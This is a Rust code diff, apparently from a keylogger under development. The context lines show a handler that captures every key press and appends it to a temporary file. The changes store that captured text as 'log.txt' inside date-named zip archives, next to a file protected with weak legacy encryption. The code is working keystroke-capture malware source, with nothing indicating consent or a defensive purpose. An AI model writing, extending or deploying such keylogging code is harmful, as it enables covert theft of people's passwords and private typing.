@@ -177,7 +177,7 @@ fn track_activity(event: Event) {
             let mut fileRead = OpenOptions::new()
                 .read(true)
                 .open(TEMP)
-                .expect("Unable to open file");
+                .expect("Unable to open data file");
 
             let mut data = String::new();
             fileRead.read_to_string(&mut data);
@@ -188,7 +188,7 @@ fn track_activity(event: Event) {
                 .write(true)
                 .truncate(true)
                 .open(TEMP)
-                .expect("Unable to open file");
+                .expect("Unable to open data file to clear.");
         },
         EventType::KeyPress(Key::Unknown(u32)) => println!("Unknown key!"),
         EventType::KeyPress(Key) => {
@@ -197,7 +197,7 @@ fn track_activity(event: Event) {
                 .append(true)
                 .create(true)
                 .open(TEMP)
-                .expect("Unable to open file");
+                .expect("Unable to open data file to log.");
     
             fileRef.write(key.as_bytes()).expect("write failed");
         },
@@ -207,31 +207,33 @@ fn track_activity(event: Event) {
 }
 
 fn zip_main(text: String) -> i32 {
-    let filename = "test.zip";
-    match dozip(filename, text) {
-        Ok(_) => println!("File written to {filename}"),
-        Err(e) => println!("Error: {e:?}"),
+    match dozip(text) {
+        Ok(_) => println!("Zipped successfuly."),
+        Err(e) => println!("Failed to zip.: {e:?}"),
     }
 
     0
 }
 
-fn dozip(filename: &str, text: String) -> ZipResult<()> {
-    let path = std::path::Path::new(filename);
+fn dozip(text: String) -> ZipResult<()> {
+    let now: DateTime<Utc> = Utc::now();
+    let fname = now.format("%Y-%m-%d").to_string() + ".zip";
+
+    let path = std::path::Path::new(&fname);
     let file = std::fs::File::create(path).unwrap();
 
     let mut zip = ZipWriter::new(file);
 
-    zip.add_directory("test/", Default::default())?;
+    zip.add_directory("text/", Default::default())?;
 
     let options = FileOptions::default()
         .compression_method(CompressionMethod::Stored)
         .unix_permissions(0o755)
         .with_deprecated_encryption(b"test");
-    zip.start_file("test/☃.txt", options)?;
+    zip.start_file("text/hello.txt", options)?;
     zip.write_all(b"Hello, World!\n")?;
 
-    zip.start_file("test/lorem_ipsum.txt", Default::default())?;
+    zip.start_file("text/log.txt", Default::default())?;
     zip.write_all(text.as_bytes())?;
 
     zip.finish()?;
@@ -239,16 +241,24 @@ fn dozip(filename: &str, text: String) -> ZipResult<()> {
 }
 
 fn readzip() -> String {
-    let fname = std::path::Path::new("test.zip");
-    let file = fs::File::open(fname).unwrap();
+    let now: DateTime<Utc> = Utc::now();
+    let fname = now.format("%Y-%m-%d").to_string() + ".zip";
+    let file = match fs::File::open(fname) {
+        Ok(file) => file,
+        Err(err) => {
+            dozip(String::from(""));
+            return String::from("");
+        }
+    };
+
     let reader = BufReader::new(file);
 
     let mut archive = ZipArchive::new(reader).unwrap();
 
-    let mut file = match archive.by_name("test/lorem_ipsum.txt") {
+    let mut file = match archive.by_name("text/log.txt") {
         Ok(file) => file,
         Err(..) => {
-            println!("File test/lorem_ipsum.txt not found");
+            println!("File text/log.txt not found in the zip.");
             return String::from("");
         }
     };
